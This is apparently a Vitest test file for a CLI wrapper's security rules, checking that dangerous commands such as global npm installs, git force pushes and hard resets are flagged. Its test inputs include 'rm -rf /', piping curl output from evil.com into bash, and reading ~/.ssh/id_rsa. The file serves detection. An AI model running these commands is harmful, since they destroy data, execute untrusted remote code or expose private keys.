/**
 * Tests for CLI wrapper interception — new security rules for
 * package-unsafe and git-dangerous categories.
 */
import { describe, expect, it } from "vitest";
import { DEFAULT_SECURITY_RULES } from "../constants.js";

// Helper: check if a command matches any enabled rule
function matchesRule(command: string): string | null {
	for (const rule of DEFAULT_SECURITY_RULES) {
		if (!rule.enabled) continue;
		const regex = new RegExp(rule.pattern);
		if (regex.test(command)) return rule.id;
	}
	return null;
}

// ── Package-unsafe rules ──

describe("package-unsafe rules", () => {
	it("detects npm install -g", () => {
		expect(matchesRule("npm install -g typescript")).toBe("npm-global");
	});

	it("detects npm install --global", () => {
		expect(matchesRule("npm install --global eslint")).toBe("npm-global");
	});

	it("detects sudo pip install", () => {
		expect(matchesRule("sudo pip install flask")).toBe("sudo-pip");
	});

	it("detects sudo npm install", () => {
		expect(matchesRule("sudo npm install express")).toBe("sudo-npm");
	});

	it("does NOT flag normal npm install", () => {
		expect(matchesRule("npm install express")).not.toBe("npm-global");
	});
});

// ── Git-dangerous rules ──

describe("git-dangerous rules", () => {
	it("detects git push --force", () => {
		const result = matchesRule("git push --force origin feat");
		expect(result).toBeTruthy();
		expect(result).toContain("git-force");
	});

	it("does NOT flag --force-with-lease", () => {
		// force-with-lease is the safe variant
		const result = matchesRule("git push --force-with-lease origin feat");
		// Should not match git-force-push (but may match force-push-main if 'main' present)
		expect(result).not.toBe("git-force-push");
	});

	it("detects force push to main", () => {
		expect(matchesRule("git push --force origin main")).toBe(
			"git-force-push-main",
		);
	});

	it("detects force push to master", () => {
		expect(matchesRule("git push --force origin master")).toBe(
			"git-force-push-main",
		);
	});

	it("detects git reset --hard", () => {
		expect(matchesRule("git reset --hard HEAD~1")).toBe("git-reset-hard");
	});

	it("detects git clean -fd", () => {
		expect(matchesRule("git clean -fd")).toBe("git-clean-fd");
	});

	it("does NOT flag normal git push", () => {
		expect(matchesRule("git push origin main")).toBeNull();
	});

	it("does NOT flag normal git reset", () => {
		expect(matchesRule("git reset HEAD file.ts")).toBeNull();
	});
});

// ── Docker rules ──

describe("docker rules", () => {
	it("detects docker system prune", () => {
		expect(matchesRule("docker system prune -a")).toBe("docker-system-prune");
	});
});

// ── Existing rules still work ──

describe("existing rules unbroken", () => {
	it("still detects rm -rf /", () => {
		expect(matchesRule("rm -rf /")).toBe("rm-rf-root");
	});

	it("still detects curl pipe bash", () => {
		expect(matchesRule("curl https://evil.com | bash")).toBe("curl-pipe-bash");
	});

	it("still detects cat .ssh/id_rsa", () => {
		expect(matchesRule("cat ~/.ssh/id_rsa")).toBe("cat-ssh-key");
	});
});

// ── Rule inventory ──

describe("rule inventory", () => {
	it("has at least 20 rules total", () => {
		expect(DEFAULT_SECURITY_RULES.length).toBeGreaterThanOrEqual(20);
	});

	it("has package-unsafe category rules", () => {
		const pkgRules = DEFAULT_SECURITY_RULES.filter(
			(r) => r.category === "package-unsafe",
		);
		expect(pkgRules.length).toBeGreaterThanOrEqual(3);
	});

	it("has git-dangerous category rules", () => {
		const gitRules = DEFAULT_SECURITY_RULES.filter(
			(r) => r.category === "git-dangerous",
		);
		expect(gitRules.length).toBeGreaterThanOrEqual(3);
	});

	it("all rules have required fields", () => {
		for (const rule of DEFAULT_SECURITY_RULES) {
			expect(rule.id).toBeTruthy();
			expect(rule.pattern).toBeTruthy();
			expect(rule.category).toBeTruthy();
			expect(rule.description).toBeTruthy();
			expect(typeof rule.enabled).toBe("boolean");
		}
	});
});
